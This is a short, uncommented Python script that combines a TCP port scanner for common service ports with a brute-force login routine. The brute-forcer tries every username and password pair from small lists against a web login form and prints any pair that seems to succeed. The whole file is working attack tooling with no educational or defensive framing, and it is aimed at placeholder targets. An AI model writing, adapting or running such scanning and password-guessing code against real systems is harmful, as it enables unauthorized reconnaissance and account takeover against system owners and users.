import socket
import itertools
import requests

def port_scanner(target, ports):
    print(f"Scanning ports on {target}...")
    for port in ports:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(0.5)
                result = s.connect_ex((target, port))
                if result == 0:
                    print(f"[OPEN] Port {port}")
        except Exception as e:
            print(f"[ERROR] Port {port}: {e}")

def brute_force_login(url, username_list, password_list):
    print(f"Brute-forcing {url}...")
    for username, password in itertools.product(username_list, password_list):
        payload = {'username': username, 'password': password}
        response = requests.post(url, data=payload)
        if "invalid" not in response.text.lower():
            print(f"[SUCCESS] Username: {username}, Password: {password}")
            break

target_ip = '127.0.0.1'
common_ports = [21, 22, 23, 80, 443, 8080]
port_scanner(target_ip, common_ports)

login_url = 'http://example.com/login'
usernames = ['admin', 'user']
passwords = ['1234', 'admin', 'password']
brute_force_login(login_url, usernames, passwords)
